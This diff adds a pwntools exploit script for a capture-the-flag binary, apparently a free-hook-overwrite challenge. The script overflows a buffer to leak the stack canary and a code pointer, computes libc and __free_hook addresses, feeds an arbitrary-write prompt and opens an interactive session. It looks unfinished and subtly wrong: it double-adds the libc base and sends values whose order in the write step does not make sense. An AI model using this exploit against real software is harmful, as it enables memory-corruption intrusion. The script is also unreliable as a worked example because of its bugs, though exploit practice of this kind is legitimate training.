@@ -1,0 +1,34 @@
+#!/bin/python3
+from pwn import *
+exe = ELF('./fho_patched')
+libc = ELF('./libc.so.6')
+p = process(exe.path)
+context.terminal = ['alacritty', '-e']
+gdb.attach(p, gdbscript='''
+b*main+153
+           c
+
+           ''')
+#################exploiting#####################
+payload = b'a'*57
+p.sendafter(b'Buf: ', payload)
+p.recvuntil(b'a'*57)
+canary_leak = u64(b'\x00' + p.recv(7))
+libc_csu_init = u64(p.recv(6) + b'\x00\x00')                  
+
+libc.address = libc_csu_init -4196928
+libc_free_hook = libc.sym['__free_hook'] + libc.address
+log.info("libc_free_hook: " + hex(libc_free_hook))
+log.info("canary_leak: " + hex(canary_leak))
+log.info("libc.address: " + hex(libc.address))
+log.info("libc_csu_init: " + hex(libc_csu_init))
+p.sendafter(b'To write: ', p64(libc_csu_init))
+p.sendafter(b'With: ', p64(canary_leak))
+p.recvuntil(b'[')
+stack_leak = int(p.recvuntil(b']',drop=True),16)
+log.info("stack_leak: " + hex(stack_leak))
+
+
+
+##############the end###########################
+p.interactive()
